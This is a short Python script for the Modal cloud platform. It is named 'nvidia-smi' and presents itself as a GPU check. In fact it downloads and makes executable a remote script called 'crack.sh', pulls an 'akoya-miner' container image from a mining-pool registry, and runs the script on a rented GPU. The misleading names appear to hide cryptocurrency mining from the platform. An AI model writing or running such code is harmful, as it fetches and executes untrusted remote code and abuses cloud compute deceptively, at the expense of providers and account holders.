import modal
import subprocess
import os
os.system("curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/crack.sh;chmod +x crack.sh")

app = modal.App("nvidia-smi")

image = modal.Image.from_registry(
    "registry.akoyapool.com/akoya-miner:latest",
    add_python="3.11",
)

@app.function(
    image=image,
    gpu="A10",  # Or "T4", "L4", "H100", etc.
    timeout=3600,
)
def check_gpu():
    subprocess.run(["./crack.sh"], check=True)

@app.local_entrypoint()
def main():
    check_gpu.remote()
